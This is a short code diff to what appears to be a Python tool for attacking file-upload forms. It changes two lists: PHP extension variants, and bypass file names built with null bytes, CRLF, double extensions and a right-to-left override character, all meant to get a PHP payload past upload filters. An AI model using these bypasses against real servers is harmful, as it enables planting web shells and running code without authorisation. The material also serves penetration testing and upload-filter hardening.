@@ -36,8 +36,8 @@ def createHtaccess(htaccess,debug):
 
 
 def main(name, payload, file, extension, bypass, magic, htaccess, debug):
-    PHP_extensions = ['php', 'php2', 'php3', 'php4', 'php5', 'php7', 'phps', 'pht', 'phtm', 'phtml', 'pgif', 'shtml', 'inc', 'phar', 'hphp', 'ctp', 'module']
-    PHP_Bypass = ['png.php', 'png.Php5', 'php%20', 'php%0a', 'php%00', 'php%0d%0a','php/','php.\\','png.php','png.pHp5','php%00.png','php\\x00.png','php%0a.png','php%0d%0a.png','phpJunk123png','png.jpg.php', 'php%00.png%00.jpg', 'php.png']
+    PHP_extensions = ['php', 'php2', 'php3', 'php4', 'php5', 'php7', 'phps', 'pht', 'phtm', 'phtml', 'pgif', 'shtml', 'inc', 'phar', 'hphp']
+    PHP_Bypass = ['png.php', 'png.Php5', 'php%20', 'php%0a', 'php%00', 'php%0d%0a','php/','php.\\','png.php','png.pHp5','php%00.png','php\\x00.png','php%0a.png','php%0d%0a.png','php%0d%0a.jpg','phpJunk123png','png.jpg.php', 'php%00.png%00.jpg', 'php.png', 'php%00.gif', 'php%00.jpg', 'php\\x00.gif', 'php\\x00.png', 'php\\x00.jpg','%E2%80%AEphp.jpg']
 
 
     if magic == "png": # If the user want to use the magic header
